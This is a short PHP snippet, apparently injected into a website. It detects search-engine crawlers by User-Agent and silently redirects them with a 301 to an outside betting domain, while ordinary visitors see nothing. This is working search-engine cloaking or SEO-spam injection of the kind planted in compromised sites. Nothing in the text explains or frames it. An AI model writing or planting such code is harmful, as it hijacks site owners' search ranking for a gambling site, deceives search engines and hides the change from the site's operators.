<?php
if(!empty($_SERVER['HTTP_USER_AGENT']) and preg_match('~(bot|crawl)~i', $_SERVER['HTTP_USER_AGENT'])){
header("HTTP/1.1 301 Moved Permanently");
header("Location: https://www.ucbetting.com/");
} ?>
